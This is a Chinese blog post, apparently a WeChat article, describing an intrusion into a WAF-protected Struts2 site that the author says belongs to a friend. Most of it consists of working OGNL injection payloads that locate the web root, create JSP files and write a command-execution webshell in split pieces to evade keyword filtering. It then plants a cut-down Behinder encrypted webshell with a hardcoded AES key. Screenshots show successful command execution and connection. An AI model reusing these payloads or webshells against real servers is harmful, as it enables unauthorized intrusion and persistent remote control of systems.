<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/31nUrF1v50-J2v6IOYzNYA)

继之前的 Struts2 绕过 waf 读写文件之后，遇到了一个实例，分享一下思路

0x01 背景
-------

朋友发来一个 struts2 有 waf 的站点，能检测到漏洞，但是命令执行不了，上传 shell 肯定也就不行了，估计是检测了关键字，直接开干

0x02 写命令执行马
-----------

一开始的思路是访问站点的 jsp 文件，比如`http://xx.xxx/123.jsp`测试有没有全局拦截，很显然，这里是没有的

![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLtO9fsyZ0G100hqCc0IUPspVcEM73NeWrCp1LKvY3csVYv2lTgQS1bpg/640?wx_fmt=png)

直接可以进行写 shell，先找绝对路径

#### 0x001 查看 web 目录

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}


```

![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLtQ86szm39WdFMrWH4J7iast1XOt50hwvZWv6evyEEicOjiapHXFy3fDoFQ/640?wx_fmt=png)

这里 web 目录是`/usr/local/tomcat/webapps/ROOT/`，直接写个文件到`/usr/local/tomcat/webapps/ROOT/3.jsp`

#### 0x002 创建文件

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#bb0=new java.io.FileWriter("/usr/local/tomcat/webapps/ROOT/3.jsp"),#bb0.flush(),#response.flush(),#response.close()}


```

![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLt9cbgicRAbopXm7gtpiaqdibXl59baibriadA1No0a1R6Wo7LWGsCdIeicovQ/640?wx_fmt=png)

#### 0x003 写文件

这里写文件遇到了困难，原因在于出现了关键字`getRuntime()`，但是是可以绕过的，分批次进行写入文件，本地进行测试如下

```
package Struts2bypasswaf;  
  
import java.io.BufferedWriter;  
import java.io.IOException;  
  
/**  
 * @author f0ng  
 * @date 2022/5/24  
 */public class teststruts2 {  
    public static void main(String[] args) throws IOException {  
        BufferedWriter aaa = new java.io.BufferedWriter(new java.io.FileWriter("1.txt",true));  
        aaa.append("\"");  
        aaa.flush();  
        aaa.close();  
    }  
}


```

原始文件如下

![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLt4Rm0MRxtSTzU0X6gt6MxZx8fQ8CZyaItATP8V0kMS9JHxOLg48XfzQ/640?wx_fmt=png)

执行 Java 代码后

![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLtrLBiasMCziaLuMm17ibmZc2vMvJEWY58hwqaQVktCiauZoiaN2s6l2ibUyhA/640?wx_fmt=png)

可以发现双引号被追加写入了 (这里为什么拎出来双引号，因为需要转义)

写文件分段 1

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#bb0=new java.io.BufferedWriter(new java.io.FileWriter("/usr/local/tomcat/webapps/ROOT/3.jsp",true)),#bb0.append("<% java.io.InputStream in = Runtime.getRun"),#bb0.flush(),#bb0.close(),#response.flush(),#response.close()}


```

![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLtvlpnpBpQTfav1OGyVqeZyNwIpA7pEU2Deber93sXCKHqfCqs0gnumg/640?wx_fmt=png)

写文件分段 2

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#bb0=new java.io.BufferedWriter(new java.io.FileWriter("/usr/local/tomcat/webapps/ROOT/3.jsp",true)),#bb0.append("time().exec(request.getParameter(\"pass\")).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}  %>"),#bb0.flush(),#bb0.close(),#response.flush(),#response.close()}


```

![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLtjiaCjMHXe0WOGvibHkCyx6zq6aJkNBEzVJKDmvUnmoseSH3BkOcaNDRQ/640?wx_fmt=png)

#### 0x004 执行命令

访问 webshell 即可

![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLthEsVLdfkLmJBicq1jrhtvLSkiah0KOVZ1p9t658R85IdXWgmQHQcFGAg/640?wx_fmt=png)

0x03 写入冰蝎马
----------

这时候朋友又说了，这个 webshell 不可操作，他不喜欢，连连摆手

![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLtwnbFt8VMStTRAmoYt27Xbe4Ziah6yhicbu32OrM84PnKx64yMicwDibmDA/640?wx_fmt=png)

好，那么有求必有应

那么仿造之前的方法写个冰蝎给他不就行了，前面都是一样的，给出数据包

创建文件:

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#bb0=new java.io.FileWriter("/usr/local/tomcat/webapps/ROOT/43.jsp"),#bb0.flush(),#response.flush(),#response.close()}


```

写入文件:

内容是`<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);\}\}%>`

```
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#bb0=new java.io.BufferedWriter(new java.io.FileWriter("/usr/local/tomcat/webapps/ROOT/43.jsp",true)),#bb0.append("<%@page import=\"java.util.*,javax.crypto.*,javax.crypto.spec.*\"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);\}\}%>"),#bb0.flush(),#bb0.close(),#response.flush(),#response.close()}


```

后面再写就发现出问题了，怎么都写不进去，但是一个一个字符是可以的，那么就可以单个字符进行追加写入；但是又遇到了一个问题，单个字符的`{`和`}`写不进去，原因暂不清楚，所以直接阉割了冰蝎马，后面为:

```
<% String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%>


```

去除了`if (request.getMethod().equals("POST")){}`注意要将`%`改为`%25`，要将`"`改为`\""`，转义

![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLtAW0sq4fiavad8fN4oHPY9O1ayaJyHec8VSDnMPdHHuI8SpOJWd8m9sA/640?wx_fmt=png)

连接成功![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLtsXhl4N89wR7Q4exXzcGxBEcBxprz4gspGK795XrOoYXAl4c7UsFY5Q/640?wx_fmt=png)

朋友很满意

![](https://mmbiz.qpic.cn/mmbiz_png/FYb6AdABfia0NqYI173xvjyBU4Gt67ibLtgbrIu4JYjtR6ibrIrPGvzRgDbiboQg1icFCia9OqGfUiaFICD4T1fHRSIKQ/640?wx_fmt=png)

0x04 总结
-------

1.  对于通过 http 去写入特殊字符，要考虑 URL 编码以及转义的问题，如`%`变成了`%25`，`"`变成了`\"`;
    
2.  运用到实战之前现在本地环境进行复现是很有必要的;
    
3.  文件落地比较麻烦，如果可以注入内存马那是比较方便的。
    

0x05 参考
-------

> https://mp.weixin.qq.com/s/outtxUANOa406ErGleWjtQ 【struts2 绕过 waf 读写文件及另类方式执行命令】
> 
> https://github.com/vulhub/vulhub/tree/master/struts2/s2-016 【Struts2 016 环境】